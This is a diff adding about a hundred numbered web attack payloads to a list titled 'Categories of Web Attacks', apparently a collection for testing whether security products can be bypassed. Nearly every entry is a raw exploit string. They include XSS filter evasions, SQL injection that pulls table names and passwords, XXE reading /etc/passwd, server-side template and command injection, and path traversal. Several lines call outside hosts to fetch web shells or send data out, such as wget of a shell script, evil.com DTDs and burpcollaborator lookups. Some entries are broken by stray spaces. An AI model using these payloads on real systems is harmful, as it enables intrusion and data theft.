@@ -106,3 +106,108 @@ Categories of Web Attacks (50 Categories)
 104. SQL Injection (In-band via XML): id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--
 105. SQL Injection (Blind via Error Message): id=1' AND 1=CONVERT(int, (SELECT password FROM users LIMIT 0,1))--
 106. Java Attack: adminDeviceSpaceId=131&format=%24%7b''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(''.getClass().forName('java.lang.Runtime')).exec('curl%20d6d5bt565jrc87ck692gzsym1em9spt3e.oast.me')%7d
+107. TestReal1: /Rnj7kZj.jpeg?q=%27or%201=1
+108. TestReal2: /Rnj7kZj.jpeg?q=%3Cx/Onpointerrawupdate=confirm%26lpar;)%3Exxxxx 109. Attack_PDF_1: 210 malicious requests have bypassed the security solution Payload Test case Encoder Placeholder Status RCPT TO: test@evil.com
+110. Attack_PDF_2: RCPT TO: test@evil.com
+111. Attack_PDF_3: QUIT
+112. Attack_PDF_4: V100 CAPABILITY V101 FETCH 4791
+113. Attack_PDF_5: "));if(!self.x)self.x=!alert(document.domain)}catch(e){}//
+114. Attack_PDF_6: "//Onx=""//onfocus=prompt(1)>
+115. Attack_PDF_7: "></textarea><ScRiPt>prompt(1)</ScRiPt// "><iframe/onload=alert(1)// ”/>&_lt;_script>alert(1)&_lt;/scr_ipt&gt”/>
+116. Attack_PDF_8: "><p only=1337 onmouseenter=window.location.href=//attacker.site>
+117. Attack_PDF_9: "><svg onmouseover="confirm&#0000000040document.domain)
+118. Attack_PDF_10: "><video><source onerror=eval(atob(http://some_host)) id=dmFyIGE9ZG9 jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXlkaW5 ueXVudXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#6 1;>
+119. Attack_PDF_11: "OnCliCk="(prompt`1`)
+120. Attack_PDF_12: "Onx=() onMouSeoVer=prompt(1)>
+121. Attack_PDF_13: "onClick="(prompt)(1)
+122. Attack_PDF_14: "onwheel=ead(111)
+123. Attack_PDF_15: %22onauxclick=alert`xss`+a
+124. Attack_PDF_16: %3Cx/Onpointerrawupdate=confirm%26lpar;)%3Exxxxx
+125. Attack_PDF_17: %C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AFetc%C0%AFpasswd
+126. Attack_PDF_18: &gt;+src+onerror=confirm&amp;lpar;1&amp;rpar;&lt;
+127. Attack_PDF_19: &lt;svg/onload&equals;alert(1)&gt;
+128. Attack_PDF_20: ', $or: [ {}, { 'order':'order
+129. Attack_PDF_21: '-alert(1)//
+130. Attack_PDF_22: '>alert(1)</script><script/1='
+131. Attack_PDF_23: (&(uid=admin)(!(&(1=0)(userPassword=q))))
+132. Attack_PDF_24: (alert)(1)
+133. Attack_PDF_25: (select%20group_concat(table_name,0x3a,column_name,0x5c6e)%20from%20 information_schema.columns%20where%20table_schema=database())
+134. Attack_PDF_26: (select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(1 5)))v)+'%22+(select(0)from(select(sleep(15)))v)+%22*/
+135. Attack_PDF_27: (xss"><!--><svg/onload=alert(document.domain)>)
+136. Attack_PDF_28: *(|(objectclass=*))
+137. Attack_PDF_29: -1134') OR JSON_EXTRACT('{''aKER'': 9648}', '$.aKER') = 9648*7799 AN D ('QlYa' LIKE 'QlYa
+138. Attack_PDF_30: -1945+/*!%55NiOn*/%20/*!%53eLEct*/+1,2,3,%27soy%20vulnerable%27,5,6, 7,8,9,10,11,12,13,14,15,16,17,18,19+--+
+139. Attack_PDF_31: /*!%55NiOn*/%20/*!%53eLEct*/+
+140. Attack_PDF_32: /static/img/../../etc/passwd
+141. Attack_PDF_33: 0;var date=new Date(); do{curDate = new Date();}while(curDate-date<1 0000)
+142. Attack_PDF_34: 123) AND 12=12 AND JSON_DEPTH('{}') != 2521
+143. Attack_PDF_35: 1e1 union select users from password
+144. Attack_PDF_36: 3;/* a */ DECLARE @c varchar(255);/* b */SELECT @c='ping '+master.sy s.fn_varbintohexstr(convert(varbinary,SYSTEM_USER))+'.000.burpco l'+'laborator.net';/*xx*/ EXEC Master.dbo.xp_cmdshell @c;/*xxx*/ EXE C sp_SYS_ProtoOp @id=3
+145. Attack_PDF_37: ; cat /et'c/pa'ss'wd
+146. Attack_PDF_38: ;getent$IFS$9hosts$IFS$9somehost.burpcollaborator.net;echo$IFS$9$((3 482*7301));
+147. Attack_PDF_39: ;var date = new Date(); do{curDate = new Date();}while(curDate-date
+148. Attack_PDF_40: ;wget http://some_host/sh311.sh
+149. Attack_PDF_41: <!--#exec cmd="dir" -->
+150. Attack_PDF_42: <!--#exec cmd="ls" -->
+151. Attack_PDF_43: <!--#exec cmd="wget http://some_host/shell.txt | rename shell.txt sh ell.php"-->
+152. Attack_PDF_44: <!<script>alert(document.domain)</script>
+153. Attack_PDF_45: <!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY data SYSTEM "netdoc:/et c/passwd">]><foo>&data;</foo>
+154. Attack_PDF_46: <!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "expect://i d">]><foo>&xxe;</foo>
+155. Attack_PDF_47: <!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://host/ text.txt" > ] > <foo>&xxe;</foo>
+156. Attack_PDF_48: <!DOCTYPE x SYSTEM "//x/x" > <x>a</x>
+157. Attack_PDF_49: <!DOCTYPE x [ <!ENTITY % y SYSTEM "//y/y" > %y; ]><x>a</x>
+158. Attack_PDF_50: <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("i d")}
+159. Attack_PDF_51: <<scr�ipt/src=http://xss.com/xss.js></script
+160. Attack_PDF_52: <?xml version="1.0" encoding="UTF-7"?> +ADwAIQ-DOCTYPE foo+AFs +ADwA IQ-ELEMENT foo ANY +AD4 +ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack- r.be:1337+ACI +AD4AXQA+ +ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
+161. Attack_PDF_53: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE x [<!ENTITY % xxe PU BLIC "any_text" "http://evil.com/evil.dtd">%xxe;]><root>&xxe;</root>
+162. Attack_PDF_54: <?xml version="1.0" encoding="utf-8" standalone="no" ?><x xmlns:xsi ="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="htt p://xxe-xsi-schemalocation.yourdomain[.]com/"/>
+163. Attack_PDF_55: <?xml version="1.0" encoding="utf-8" standalone="no" ?><xs:schema xm lns:xs="http://www.w3.org/2001/XMLSchema"><xs:include namespace="htt p://xxe-xsinclude-namespace.yourdomain[.]com/"/></xs:schema>
+164. Attack_PDF_56: <IMG SRC=j&#X41vascript:alert('test')>
+165. Attack_PDF_57: <a href=javas%26#99;ript:prompt%26#x28document.domain)>xss
+166. Attack_PDF_58: <body onload=alert('test1')>
+167. Attack_PDF_59: <iframe src="java sc ript:al ert()"></iframe>
+168. Attack_PDF_60: <iframe/onload='this["src"]="jav"+"as&Tab;cr"+"ipt:al"+"er"+"t()"';>
+169. Attack_PDF_61: <iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
+170. Attack_PDF_62: <img src onerror=confirm(1)>
+171. Attack_PDF_63: <img src=x onerror=alert(document.domain)>/all
+172. Attack_PDF_64: <j id=x style="-webkit-user-modify:read-write" onfocus={window.onerr or=eval}throw/0/+name>H</j>#x
+173. Attack_PDF_65: <object/data=javascript:alert()>
+174. Attack_PDF_66: <script>aaa</script>
+175. Attack_PDF_67: <svG/x=">"/oNloaD=confirm()//
+176. Attack_PDF_68: <svg%0Aonauxclick=0;[1].some(confirm)//
+177. Attack_PDF_69: <svg/onload=alert(=RND=)//
+178. Attack_PDF_70: <video src=x onerror="prompt(xss">
+179. Attack_PDF_71: <xssBypass/onpointermove=(confirm)(1)>MoveMouseHere
+180. Attack_PDF_72: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@w63gecoroprj5um8ypnd7r 6in9t0hseg3.interact.sh community-user-
+181. Attack_PDF_73: Tarun~<"><details/open/ontoggle="jAvAsCrIpT&colon;alert&lpar;/xss-by -tarun/&rpar;">XXXXX</a>
+182. Attack_PDF_74: \"autof<x>ocus o<x>nfocus=alert<x>(1)//
+183. Attack_PDF_75: \\::1\c$\users\default\ntuser.dat
+184. Attack_PDF_76: __proto__[v-if]=_c.constructor('alert(1)')()
+185. Attack_PDF_77: `curl -L http://ⒼⓄⓄⒼⓁⒺ.ⒸⓄⓂ`
+186. Attack_PDF_78: aaaa\u0027%2b#{16*8787}%2b\u0027bbb
+187. Attack_PDF_79: alert.apply(null, [1])
+188. Attack_PDF_80: alert.call(%20, "XSS");
+189. Attack_PDF_81: alert?.(document?.cookie)
+190. Attack_PDF_82: ax--exec=`id`--remote=origin
+191. Attack_PDF_83: cmd=127.0.0.1 && ls /etc
+192. Attack_PDF_84: confirm.call(null,1)
+193. Attack_PDF_85: data:text/html,<form action=https://127.0.0.1/xss-cp.php method=post ><input type=hidden name=a value="<img/src=//127.0.0.1/yt.jpg onpoin terenter=alert`1`>"><input type=submit></form>
+194. Attack_PDF_86: db.injection.insert({success:1});
+195. Attack_PDF_87: document["cookie"]
+196. Attack_PDF_88: eval(atob("YWxlcnQoKQ=="))
+197. Attack_PDF_89: file:///etc/./passwd
+198. Attack_PDF_90: http://lmb1ikpej3yys0gqft8lxewm2d89w5qtgh840sp.burpcollaborator.net/ 6.17.0.RELEASE iPhone12,8 iOS/14.5.1)) community-user-
+199. Attack_PDF_91: javascript:%ef%bb%bfalert(XSS)
+200. Attack_PDF_92: javascript:setInterval('ale'+'rt(document.domain)')
+201. Attack_PDF_93: javascript:setInterval('con'+'firm(document.domain)')
+202. Attack_PDF_94: javascript:setInterval('fet'+'ch(document.domain)')
+203. Attack_PDF_95: javascript:setInterval('prom'+'pt(document.domain)')
+204. Attack_PDF_96: mercuryboard_user_agent_sql_injection.nasl' community-user-
+205. Attack_PDF_97: prompt.call(null,1)
+206. Attack_PDF_98: sometext<svg onload=alert(document.domain)>?mimeType=text/html
+207. Attack_PDF_99: true, $where: '99 == 88'
+208. Attack_PDF_100: userPassword:2.5.13.18:=123
+209. Attack_PDF_101: {` <body \< onscroll =1(_=prompt,_(String.fromCharCode(88,83,83,32,6 6,121,32,77,111,114,112,104,105,110,101)))>´}
+210. Attack_PDF_102: {{1337*1338}}
+211. Attack_PDF_103: | set /a 3482*7301
+212. Attack_PDF_104: |getent+hosts+somehost.burpcollaborator.net.&
